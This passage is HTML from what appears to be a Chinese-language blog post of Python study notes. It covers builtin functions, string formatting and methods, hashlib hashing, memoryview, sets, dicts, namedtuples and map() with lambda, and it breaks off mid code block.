href="https://docs.python.org/3/library/functions.html#isinstance"><code>isinstance()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#ord"><code>ord()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#sum"><code>sum()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#func-bytearray"><code>bytearray()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#filter"><code>filter()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#issubclass"><code>issubclass()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#pow"><code>pow()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#super"><code>super()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#func-bytes"><code>bytes()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#float"><code>float()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#iter"><code>iter()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#print"><code>print()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-tuple"><code>tuple()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#callable"><code>callable()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#format"><code>format()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#len"><code>len()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#property"><code>property()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#type"><code>type()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#chr"><code>chr()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-frozenset"><code>frozenset()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-list"><code>list()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-range"><code>range()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#vars"><code>vars()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#classmethod"><code>classmethod()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#getattr"><code>getattr()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#locals"><code>locals()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#repr"><code>repr()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#zip"><code>zip()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#compile"><code>compile()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#globals"><code>globals()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#map"><code>map()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#reversed"><code>reversed()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#__import__"><code>__import__()</code></a></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#complex"><code>complex()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#hasattr"><code>hasattr()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#max"><code>max()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#round"><code>round()</code></a></td><td></td></tr><tr><td><a href="https://docs.python.org/3/library/functions.html#delattr"><code>delattr()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#hash"><code>hash()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-memoryview"><code>memoryview()</code></a></td><td><a href="https://docs.python.org/3/library/functions.html#func-set"><code>set()</code></a></td><td></td></tr></tbody></table><h1 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h1><h2 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h2><p><code>string.ascii_letters</code></p><blockquote><p>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</p></blockquote><p><code>string.ascii_lowercase</code></p><blockquote><p>abcdefghijklmnopqrstuvwxyz</p></blockquote><p><code>string.digits</code></p><blockquote><p>0123456789</p></blockquote><p><code>string.punctuation</code></p><blockquote><p>!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~</p></blockquote><p><code>string.whitespace</code></p><blockquote><p>\t\n\r\x0b\x0c</p></blockquote><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#123;0&#125;&#123;1&#125;&#123;0&#125;&#x27;</span>.format(<span class="hljs-string">&#x27;abra&#x27;</span>, <span class="hljs-string">&#x27;cad&#x27;</span>)   <span class="hljs-comment"># arguments&#x27; indices can be repeated</span><br><span class="hljs-string">&#x27;abracadabra&#x27;</span><br><br><span class="hljs-comment">#按名称访问参数:</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;Coordinates: &#123;latitude&#125;, &#123;longitude&#125;&#x27;</span>.format(latitude=<span class="hljs-string">&#x27;37.24N&#x27;</span>, longitude=<span class="hljs-string">&#x27;-115.81W&#x27;</span>)<br><span class="hljs-string">&#x27;Coordinates: 37.24N, -115.81W&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>coord = &#123;<span class="hljs-string">&#x27;latitude&#x27;</span>: <span class="hljs-string">&#x27;37.24N&#x27;</span>, <span class="hljs-string">&#x27;longitude&#x27;</span>: <span class="hljs-string">&#x27;-115.81W&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;Coordinates: &#123;latitude&#125;, &#123;longitude&#125;&#x27;</span>.format(**coord)<br><span class="hljs-string">&#x27;Coordinates: 37.24N, -115.81W&#x27;</span><br><br><span class="hljs-comment">#对齐文本以及指定宽度:</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#123;:&lt;30&#125;&#x27;</span>.format(<span class="hljs-string">&#x27;left aligned&#x27;</span>)<br><span class="hljs-string">&#x27;left aligned                  &#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#123;:&gt;30&#125;&#x27;</span>.format(<span class="hljs-string">&#x27;right aligned&#x27;</span>)<br><span class="hljs-string">&#x27;                 right aligned&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#123;:^30&#125;&#x27;</span>.format(<span class="hljs-string">&#x27;centered&#x27;</span>)<br><span class="hljs-string">&#x27;           centered           &#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#123;:*^30&#125;&#x27;</span>.format(<span class="hljs-string">&#x27;centered&#x27;</span>)  <span class="hljs-comment"># use &#x27;*&#x27; as a fill char</span><br><span class="hljs-string">&#x27;***********centered***********&#x27;</span><br><span class="hljs-comment">####################</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>width = <span class="hljs-number">5</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>,<span class="hljs-number">12</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">for</span> base <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;dXob&#x27;</span>:<br><span class="hljs-meta">... </span>        print(<span class="hljs-string">&#x27;&#123;0:&#123;width&#125;&#123;base&#125;&#125;&#x27;</span>.format(num, base=base, width=width), end=<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-meta">... </span>    print()<br>...<br>    <span class="hljs-number">5</span>     <span class="hljs-number">5</span>     <span class="hljs-number">5</span>   <span class="hljs-number">101</span><br>    <span class="hljs-number">6</span>     <span class="hljs-number">6</span>     <span class="hljs-number">6</span>   <span class="hljs-number">110</span><br>    <span class="hljs-number">7</span>     <span class="hljs-number">7</span>     <span class="hljs-number">7</span>   <span class="hljs-number">111</span><br>    <span class="hljs-number">8</span>     <span class="hljs-number">8</span>    <span class="hljs-number">10</span>  <span class="hljs-number">1000</span><br>    <span class="hljs-number">9</span>     <span class="hljs-number">9</span>    <span class="hljs-number">11</span>  <span class="hljs-number">1001</span><br>   <span class="hljs-number">10</span>     A    <span class="hljs-number">12</span>  <span class="hljs-number">1010</span><br>   <span class="hljs-number">11</span>     B    <span class="hljs-number">13</span>  <span class="hljs-number">1011</span><br></code></pre></td></tr></table></figure><h2 id="内置函数-1"><a href="#内置函数-1" class="headerlink" title="内置函数"></a>内置函数</h2><ol><li><code>str.encode(encoding=&quot;utf-8&quot;, errors=&quot;strict&quot;)</code></li><li><code>str.find(sub[, start[, end]])</code></li></ol><p>返回子字符串  <em>sub</em>  在  <code>s[start:end]</code>  切片内被找到的最小索引。 可选参数  <em>start</em>  与  <em>end</em>  会被解读为切片表示法。 如果  <em>sub</em>  未被找到则返回  <code>-1</code>。</p><ol start="3"><li><code>str.isalnum``()</code></li></ol><p>如果字符串中的所有字符都是字母或数字且至少有一个字符，则返回  <code>True</code> ， 否则返回  <code>False</code> 。 如果  <code>c.isalpha()</code> ， <code>c.isdecimal()</code> ， <code>c.isdigit()</code> ，或  <code>c.isnumeric()</code>  之中有一个返回  <code>True</code> ，则字符<code>c</code>是字母或数字。</p><ol start="4"><li><code>str.isalpha()</code></li></ol><p>如果字符串中的所有字符都是字母，并且至少有一个字符，返回 <code>True</code> ，否则返回 <code>False</code> 。字母字符是指那些在 Unicode 字符数据库中定义为 “Letter” 的字符，即那些具有 “Lm”、”Lt”、”Lu”、”Ll” 或 “Lo” 之一的通用类别属性的字符。 注意，这与 Unicode 标准中定义的”字母”属性不同。</p><ol start="5"><li><code>str.isascii()</code></li></ol><p>如果字符串为空或字符串中的所有字符都是 ASCII ，返回 <code>True</code> ，否则返回 <code>False</code> 。ASCII 字符的码点范围是 U+0000-U+007F 。<br>_</p><ol start="6"><li><code>str.isdecimal()</code></li></ol><p>如果字符串中的所有字符都是十进制字符且该字符串至少有一个字符，则返回 <code>True</code> ， 否则返回 <code>False</code> 。十进制字符指那些可以用来组成 10 进制数字的字符，例如 U+0660 ，即阿拉伯字母数字 0 。 严格地讲，十进制字符是 Unicode 通用类别 “Nd” 中的一个字符。</p><ol start="7"><li><code>str.isdigit()</code></li></ol><p>如果字符串中的所有字符都是数字，并且至少有一个字符，返回 <code>True</code> ，否则返回 <code>False</code> 。 数字包括十进制字符和需要特殊处理的数字，如兼容性上标数字。这包括了不能用来组成 10 进制数的数字，如 Kharosthi 数。 严格地讲，数字是指属性值为 Numeric_Type=Digit 或 Numeric_Type=Decimal 的字符。</p><ol start="8"><li><code>str.isspace()</code></li></ol><p>如果字符串中只有空白字符且至少有一个字符则返回 <code>True</code> ，否则返回 <code>False</code> 。</p><ol start="9"><li><code>str.join(iterable)</code></li></ol><p>返回一个由 <em>iterable</em> 中的字符串拼接而成的字符串。 如果 <em>iterable</em> 中存在任何非字符串值包括 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes"><code>bytes</code></a> 对象则会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#TypeError"><code>TypeError</code></a>。 调用该方法的字符串将作为元素之间的分隔。</p><ol start="10"><li><code>str.replace(old, new[, count])</code></li></ol><p>返回字符串的副本，其中出现的所有子字符串 <em>old</em> 都将被替换为 <em>new_。 如果给出了可选参数 _count_，则只替换前 _count</em> 次出现。</p><ol start="11"><li><code>str.rsplit(sep=None, maxsplit=-1)</code></li></ol><p>返回一个由字符串内单词组成的列表，使用 <em>sep</em> 作为分隔字符串。 如果给出了 <em>maxsplit_，则最多进行 _maxsplit</em> 次拆分，从 <em>最右边</em> 开始。 如果 <em>sep</em> 未指定或为 <code>None</code>，任何空白字符串都会被作为分隔符。 除了从右边开始拆分，<a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#str.rsplit"><code>rsplit()</code></a> 的其他行为都类似于下文所述的 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#str.split"><code>split()</code></a>。</p><ol start="12"><li><code>str.translate(table)</code></li></ol><p>返回原字符串的副本，其中每个字符按给定的转换表进行映射。 转换表必须是一个使用 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#object.__getitem__"><code>__getitem__()</code></a> 来实现索引操作的对象，通常为 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-mapping">mapping</a> 或 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-sequence">sequence</a>。 当以 Unicode 码位序号（整数）为索引时，转换表对象可以做以下任何一种操作：返回 Unicode 序号或字符串，将字符映射为一个或多个字符；返回 <code>None</code>，将字符从结果字符串中删除；或引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#LookupError"><code>LookupError</code></a> 异常，将字符映射为其自身。<br>你可以使用 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#str.maketrans"><code>str.maketrans()</code></a> 基于不同格式的字符到字符映射来创建一个转换映射表。</p><h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="hashlib-模块"><a href="#hashlib-模块" class="headerlink" title="hashlib 模块"></a>hashlib 模块</h2><p>可用的哈希算法构造器有  <code>sha1()</code>,<code> sha224()</code>, <code>sha256()</code>, <code>sha384()</code>, <code>sha512()</code>, <a href="https://docs.python.org/zh-cn/3/library/hashlib.html#hashlib.blake2b"><code>blake2b()</code></a>和  <a href="https://docs.python.org/zh-cn/3/library/hashlib.html#hashlib.blake2s"><code>blake2s()</code></a>、<code>md5()</code>通常也是可用的。<br>具体清单如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-string">&#x27;blake2b&#x27;</span>,<br> <span class="hljs-string">&#x27;blake2s&#x27;</span>,<br> <span class="hljs-string">&#x27;md5&#x27;</span>,<br> <span class="hljs-string">&#x27;sha1&#x27;</span>,<br> <span class="hljs-string">&#x27;sha224&#x27;</span>,<br> <span class="hljs-string">&#x27;sha256&#x27;</span>,<br> <span class="hljs-string">&#x27;sha384&#x27;</span>,<br> <span class="hljs-string">&#x27;sha3_224&#x27;</span>,<br> <span class="hljs-string">&#x27;sha3_256&#x27;</span>,<br> <span class="hljs-string">&#x27;sha3_384&#x27;</span>,<br> <span class="hljs-string">&#x27;sha3_512&#x27;</span>,<br> <span class="hljs-string">&#x27;sha512&#x27;</span>,<br> <span class="hljs-string">&#x27;shake_128&#x27;</span>,<br> <span class="hljs-string">&#x27;shake_256&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>用法示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">hashlib.sha224(<span class="hljs-string">b&quot;Nobody inspects the spammish repetition&quot;</span>).hexdigest()<br><span class="hljs-comment">#&#x27;a4337bc45a8fc544c03f52dc550cd6e1e87021bc896588bd79e901e2&#x27;</span><br><br>In []: hashlib.md5(<span class="hljs-string">b&#x27;1111&#x27;</span>).hexdigest()<br>Out[]: <span class="hljs-string">&#x27;b59c67bf196a4758191e42f76670ceba&#x27;</span><br></code></pre></td></tr></table></figure><p>详细用法可参考：<a href="https://docs.python.org/zh-cn/3/library/hashlib.html">https://docs.python.org/zh-cn/3/library/hashlib.html</a></p><h1 id="二进制操作"><a href="#二进制操作" class="headerlink" title="二进制操作"></a>二进制操作</h1><p>操作二进制数据的核心内置类型是  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes"><code>bytes</code></a>  和  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytearray"><code>bytearray</code></a>。<br>bytes 对象是由整数构成的序列（类似于元组），但其实操作仍然类似于字符串，上面提到的函数在 byte 中仍然适用。<br>bytearray 对象是可变的，该对象除了  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes-methods">bytes 和 bytearray 操作</a>  中所描述的 bytes 和 bytearray 共有操作之外，还支持  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#typesseq-mutable">可变</a>  序列操作。</p><h1 id="内存视图"><a href="#内存视图" class="headerlink" title="内存视图"></a>内存视图</h1><p><a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#memoryview"><code>memoryview</code></a>  对象允许 Python 代码访问一个对象的内部数据</p><p>创建一个引用  <em>obj</em>  的  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#memoryview"><code>memoryview</code></a>。 <em>obj</em>  必须支持缓冲区协议。 支持缓冲区协议的内置对象包括  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes"><code>bytes</code></a>  和  <code>[bytearray](https://docs.python.org/zh-cn/3/library/stdtypes.html#bytearray)</code>，<code>array</code>。</p><p><a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#memoryview"><code>memoryview</code></a>  具有  <em>元素</em>  的概念，即由原始对象  <em>obj</em>  所处理的基本内存单元。 对于许多简单类型例如  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes"><code>bytes</code></a>  和  <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytearray"><code>bytearray</code></a>  来说，一个元素就是一个字节，但是其他的类型例如  <a href="https://docs.python.org/zh-cn/3/library/array.html#array.array"><code>array.array</code></a>  可能有更大的元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>v = memoryview(<span class="hljs-string">b&#x27;abcefg&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>v[<span class="hljs-number">1</span>]<br><span class="hljs-number">98</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bytes(v[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>])<br><span class="hljs-string">b&#x27;bce&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="set-集合"><a href="#set-集合" class="headerlink" title="set 集合"></a>set 集合</h1><p><em>set</em>  对象是由具有唯一性的  <a href="https://docs.python.org/zh-cn/3/glossary.html#term-hashable">hashable</a>  对象所组成的无序多项集。 常见的用途包括成员检测、从序列中去除重复项以及数学中的集合类计算，例如<strong>交集、并集、差集与对称差集</strong>等等。</p><p>作为一种无序的多项集，集合并不记录元素位置或插入顺序。 相应地，集合<strong>不支持索引、切片或其他序列类的操作</strong>。</p><p><a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#set"><code>set</code></a>  类型是可变的 — 其内容可以使用  <code>add()</code>  和  <code>remove()</code>  这样的方法来改变。 由于是可变类型，它没有哈希值，且不能被用作字典的键或其他集合的元素。 <br>集合可用多种方式来创建:</p><ul><li><p>使用花括号内以逗号分隔元素的方式: <code>&#123;&#39;jack&#39;, &#39;sjoerd&#39;&#125;</code></p></li><li><p>使用集合推导式: <code>&#123;c for c in &#39;abracadabra&#39; if c not in &#39;abc&#39;&#125;</code></p></li><li><p>使用类型构造器: <code>set()</code>, <code>set(&#39;foobar&#39;)</code>, <code>set([&#39;a&#39;, &#39;b&#39;, &#39;foo&#39;])</code></p></li><li><p><code>isdisjoint</code>(<em>other</em>)</p></li></ul><p>如果集合中没有与 <em>other</em> 共有的元素则返回 <code>True</code>。 当且仅当两个集合的交集为空集合时，两者为不相交集合。</p><ul><li><code>issubset</code>(<em>other</em>)<code>set &lt;= other</code></li></ul><p>检测是否集合中的每个元素都在 <em>other</em> 之中。</p><ul><li><code>set &lt; other</code></li></ul><p>检测集合是否为 <em>other</em> 的真子集，即 <code>set &lt;= other and set != other</code>。</p><ul><li><code>issuperset</code>(<em>other</em>)<code>set &gt;= other</code></li></ul><p>检测是否 <em>other</em> 中的每个元素都在集合之中。</p><ul><li><code>set &gt; other</code></li></ul><p>检测集合是否为 <em>other</em> 的真超集，即 <code>set &gt;= other and set != other</code>。</p><ul><li><code>intersection</code>(<em>*others</em>)</li></ul><p><code>set &amp; other &amp; ...</code><br>返回一个新集合，其中包含原集合以及 others 指定的所有集合中共有的元素。</p><ul><li><code>difference</code>(<em>*others</em>)<code>set - other - ...</code></li></ul><p>返回一个新集合，其中包含原集合中在 others 指定的其他集合中不存在的元素。</p><ul><li><code>symmetric_difference</code>(<em>other</em>)<code>set ^ other</code></li></ul><p>返回一个新集合，其中的元素或属于原集合或属于 <em>other</em> 指定的其他集合，但不能同时属于两者。</p><ul><li><code>update</code>(<em>*others</em>)<code>set |= other | ...</code></li></ul><p>更新集合，添加来自 others 中的所有元素。</p><ul><li><code>intersection_update</code>(<em>*others</em>)<code>set &amp;= other &amp; ...</code></li></ul><p>更新集合，只保留其中在所有 others 中也存在的元素。</p><ul><li><code>difference_update</code>(<em>*others</em>)<code>set -= other | ...</code></li></ul><p>更新集合，移除其中也存在于 others 中的元素。</p><ul><li><code>symmetric_difference_update</code>(<em>other</em>)<code>set ^= other</code></li></ul><p>更新集合，只保留存在于集合的一方而非共同存在的元素。</p><ul><li><code>add</code>(<em>elem</em>)<a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#frozenset.add">¶</a></li></ul><p>将元素 <em>elem</em> 添加到集合中。</p><ul><li><code>remove</code>(<em>elem</em>)</li></ul><p>从集合中移除元素 <em>elem_。 如果 _elem</em> 不存在于集合中则会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#KeyError"><code>KeyError</code></a>。</p><ul><li><code>discard</code>(<em>elem</em>)</li></ul><p>如果元素 <em>elem</em> 存在于集合中则将其移除。</p><ul><li><code>pop</code>()</li></ul><p>从集合中移除并返回任意一个元素。 如果集合为空则会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#KeyError"><code>KeyError</code></a>。</p><h1 id="字典-dict"><a href="#字典-dict" class="headerlink" title="字典 dict"></a>字典 dict</h1><p>字典取值常常直接 d[j]了，但是有可能报错，这里有一种更保险的取值方式–<br><code>get</code>(<em>key</em>[, <em>default</em>])<br>如果 <em>key</em> 存在于字典中则返回 <em>key</em> 的值，否则返回 <em>default_。 如果 _default</em> 未给出则默认为 <code>None</code>，因而此方法绝不会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#KeyError"><code>KeyError</code></a>。</p><p>其他操作：</p><ul><li><code>reversed(d)</code></li></ul><p>返回一个逆序获取字典键的迭代器。 这是 <code>reversed(d.keys())</code> 的快捷方式。</p><ul><li><code>setdefault</code>(<em>key</em>[, <em>default</em>])</li></ul><p>如果字典存在键 <em>key</em> ，返回它的值。如果不存在，插入值为 <em>default</em> 的键 <em>key</em> ，并返回 <em>default</em> 。 <em>default</em> 默认为 <code>None</code>。</p><ul><li><code>values</code>()</li></ul><p>返回由字典值组成的一个新视图。</p><ul><li><code>keys</code>()</li></ul><p>返回由字典键组成的一个新视图。</p><p><code>iter(dictview)</code><br>返回字典中的键、值或项（以 <code>(键, 值)</code> 为元素的元组表示）的迭代器。<br>键和值是按插入时的顺序进行迭代的。 这样就允许使用 <a href="https://docs.python.org/zh-cn/3/library/functions.html#zip"><code>zip()</code></a> 来创建 <code>(值, 键)</code> 对: <code>pairs = zip(d.values(), d.keys())</code>。 另一个创建相同列表的方式是 <code>pairs = [(v, k) for (k, v) in d.items()]</code>.</p><h1 id="tuple-元组"><a href="#tuple-元组" class="headerlink" title="tuple-元组"></a>tuple-元组</h1><p>元组是：</p><ul><li>不可变</li><li>有序</li><li>异质</li><li>索引（从零开始）</li><li>带圆括号（可选，但建议）</li><li>在迭代过程中更快，因为它是不可变的</li></ul><p>元组<strong>对于创建</strong>通常包含相关信息（例如员工信息）的<strong>对象</strong>很有用。换句话说，元组可以让我们将相关信息“块”在一起，并将其用作单个事物。</p><h2 id="访问元素"><a href="#访问元素" class="headerlink" title="访问元素"></a>访问元素</h2><ul><li><strong>正索引</strong>从元组的开始开始计数。</li><li><strong>负索引</strong>从元组的末尾开始计数。</li><li>一定<strong>范围的索引</strong>将使用指定的项目创建一个新的元组（称为<strong>Slicing</strong>）。</li><li>范围[m:n]是指从位置 m（_含_）到位置 n（_不含_）。</li><li>使用<strong>双索引</strong>访问嵌套元组的元素。</li></ul><h2 id="创建键值对（命名）元组"><a href="#创建键值对（命名）元组" class="headerlink" title="创建键值对（命名）元组"></a>创建键值对（命名）元组</h2><p>命名元组示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> collections<br>Record = collections.namedtuple(<span class="hljs-string">&#x27;Record&#x27;</span>, [<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;date&#x27;</span>])<br>R1 = Record(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;My Record&#x27;</span>, <span class="hljs-string">&#x27;12/12/2020&#x27;</span>)<br><span class="hljs-comment">#Accessing using index</span><br>print(<span class="hljs-string">&quot;Record id is:&quot;</span>, R1[<span class="hljs-number">0</span>]) <span class="hljs-comment"># Record id is: 1</span><br><span class="hljs-comment"># Accessing using key</span><br>print(<span class="hljs-string">&quot;Record name is:&quot;</span>, R1.name) <span class="hljs-comment"># Record name is: My Record</span><br></code></pre></td></tr></table></figure><p>不过创建之后无法改变它们的值了，因为是元组。</p><h1 id="属性判断"><a href="#属性判断" class="headerlink" title="属性判断"></a>属性判断</h1><p>不要在 if 中使用 type 函数判断属性，而应该选择 isinstance()函数，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt; isinstance(<span class="hljs-string">&#x27;11&#x27;</span>,str)<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><h1 id="map-作用于-list-每一个元素"><a href="#map-作用于-list-每一个元素" class="headerlink" title="map-作用于 list 每一个元素"></a>map-作用于 list 每一个元素</h1><blockquote><p>参考：<a href="https://yangfangs.github.io/2017/08/23/python-map-zip-filter-reduce/">https://yangfangs.github.io/2017/08/23/python-map-zip-filter-reduce/</a></p></blockquote><p>map()是 Python 内置的高阶函数，它接收一个函数 f() 和一个 list，并通过把函数 f 依次作用在 list 的每个元素上，得到一个新的 list 并返回。</p><ol><li>例如 chr 类型转换成 int</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">l = [<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>]<br>list(map(int,l))<br>Out[<span class="hljs-number">2</span>]: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><ol start="2"><li>编写独立函数作用与 list 中每一个元素：<ul><li>例如对 list 中每一个元素求平方</li></ul></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">return</span> x**<span class="hljs-number">2</span><br>l =[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>list(map(f,l))<br>Out[<span class="hljs-number">3</span>]: [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>]<br></code></pre></td></tr></table></figure><ol start="3"><li>使用匿名函数操作：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">l =[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>list(map(<span class="hljs-keyword">lambda</span> x: x**<span class="hljs-number">2</span>, l))<br>Out[<span class="hljs-number">4</span>]: [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>]<br></code></pre></td></tr></table></figure><h2 id="同时操作两个-list-并行非多核运算"><a href="#同时操作两个-list-并行非多核运算" class="headerlink" title="同时操作两个 list(并行非多核运算)"></a>同时操作两个 list(并行非多核运算)</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 